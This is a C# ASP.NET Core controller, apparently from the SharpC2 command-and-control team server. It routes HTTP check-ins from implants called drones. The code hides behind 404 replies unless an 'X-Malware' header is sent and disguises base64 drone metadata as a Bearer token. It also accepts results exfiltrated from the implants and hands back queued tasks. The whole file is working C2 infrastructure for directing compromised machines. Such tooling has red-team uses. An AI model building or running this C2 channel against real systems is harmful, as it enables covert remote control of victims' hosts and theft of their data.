using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;

using TeamServer.Hubs;
using TeamServer.Interfaces;
using TeamServer.Models;
using TeamServer.Services;

namespace TeamServer.Handlers
{
    [Controller]
    public class HttpHandlerController : ControllerBase
    {
        private readonly SharpC2Service _server;

        public HttpHandlerController(SharpC2Service server)
        {
            _server = server;
        }

        public async Task<IActionResult> RouteDrone()
        {
            // troll if X-Malware header isn't present
            if (!HttpContext.Request.Headers.TryGetValue("X-Malware", out _)) return NotFound();

            // first, extract drone metadata
            var metadata = ExtractMetadata(HttpContext.Request.Headers);

            // if it's null, return a 404
            if (metadata is null) return NotFound();

            // if GET, just a checkin, it's not sending data
            // if POST, it's sending data, so read it
            if (HttpContext.Request.Method.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                using var sr = new StreamReader(HttpContext.Request.Body);
                var body = await sr.ReadToEndAsync();
                await ExtractMessagesFromBody(body);
            }

            // get anything outbound
            var envelopes = (await _server.GetDroneTasks(metadata)).ToArray();

            if (!envelopes.Any()) return NoContent();
            return Ok(envelopes);
        }

        private static DroneMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            // remove "Bearer " from string
            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);

            return Convert.FromBase64String(encodedMetadata)
                .Deserialize<DroneMetadata>();
        }

        private async Task ExtractMessagesFromBody(string body)
        {
            var envelopes = body.Deserialize<IEnumerable<MessageEnvelope>>();
            if (envelopes is null) return;

            await _server.HandleC2Envelopes(envelopes);
        }
    }
}